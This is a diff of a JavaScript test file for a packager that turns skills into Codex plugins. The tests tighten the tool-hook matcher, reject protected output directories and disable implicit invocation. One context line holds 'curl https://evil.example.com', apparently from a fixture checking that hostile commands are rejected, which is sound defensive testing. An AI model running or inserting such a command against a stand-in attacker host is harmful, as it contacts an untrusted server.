@@ -24,10 +24,10 @@ async function runCli(args, cwd = repoRoot) {
   });
 }
 
-test('compileCodexHooks emits Bash|apply_patch|mcp__* matcher with PLUGIN_ROOT', () => {
+test('compileCodexHooks emits anchored Bash/apply_patch/mcp matcher with PLUGIN_ROOT', () => {
   const compiled = compileCodexHooks({ policyRelativePath: 'policy/skillsforge.json' });
   const entry = compiled.hooks.PreToolUse[0];
-  assert.equal(entry.matcher, 'Bash|apply_patch|mcp__*');
+  assert.equal(entry.matcher, '^(Bash|apply_patch|mcp__.*)$');
   assert.match(entry.hooks[0].command, /\$\{PLUGIN_ROOT\}/);
   assert.match(entry.hooks[0].command, /codex-pre-tool-policy\.mjs/);
   assert.match(entry.hooks[0].command, /policy\/skillsforge\.json/);
@@ -89,7 +89,7 @@ test('packageCodexPlugin --write emits complete plugin and receipt', async (cont
   assert.ok(policySource.equals(policyCopy));
 
   const hooks = JSON.parse(await readFile(join(out, 'hooks', 'hooks.json'), 'utf8'));
-  assert.equal(hooks.hooks.PreToolUse[0].matcher, 'Bash|apply_patch|mcp__*');
+  assert.equal(hooks.hooks.PreToolUse[0].matcher, '^(Bash|apply_patch|mcp__.*)$');
 });
 
 test('packageCodexPlugin rejects multi-skill packaging', async () => {
@@ -149,6 +149,25 @@ curl https://evil.example.com
   await assert.rejects(() => access(join(out, '.codex-plugin', 'plugin.json')));
 });
 
+test('packageCodexPlugin rejects protected output roots', async (context) => {
+  const root = await mkdtemp(join(tmpdir(), 'sf-codex-protected-'));
+  context.after(() => rm(root, { recursive: true, force: true }));
+  const skillDir = join(root, 'good-with-sidecar');
+  await cp(join(repoRoot, 'tests', 'fixtures', 'skills', 'good-with-sidecar'), skillDir, { recursive: true });
+  const marker = join(root, 'keep.txt');
+  await writeFile(marker, 'must remain\n');
+
+  const result = await packageCodexPlugin({
+    skillDir,
+    outDir: root,
+    write: true,
+    force: true
+  });
+  assert.equal(result.ok, false);
+  assert.match(result.errors.join('\n'), /protected output directory/i);
+  assert.equal(await readFile(marker, 'utf8'), 'must remain\n');
+});
+
 test('CLI package --host codex help and dry-run', async () => {
   const help = await runCli(['help']);
   assert.equal(help.code, 0, help.stderr);
@@ -188,6 +207,6 @@ test('packageCodexPlugin generates openai.yaml when missing', async (context) =>
   assert.equal(result.ok, true, JSON.stringify(result.errors));
   const yaml = await readFile(join(out, 'skills', 'good-with-sidecar', 'agents', 'openai.yaml'), 'utf8');
   assert.match(yaml, /display_name:/);
-  assert.match(yaml, /allow_implicit_invocation:\s*true/);
+  assert.match(yaml, /allow_implicit_invocation:\s*false/);
   assert.ok(result.interop.transformed.some((item) => item.includes('openai.yaml')));
 });
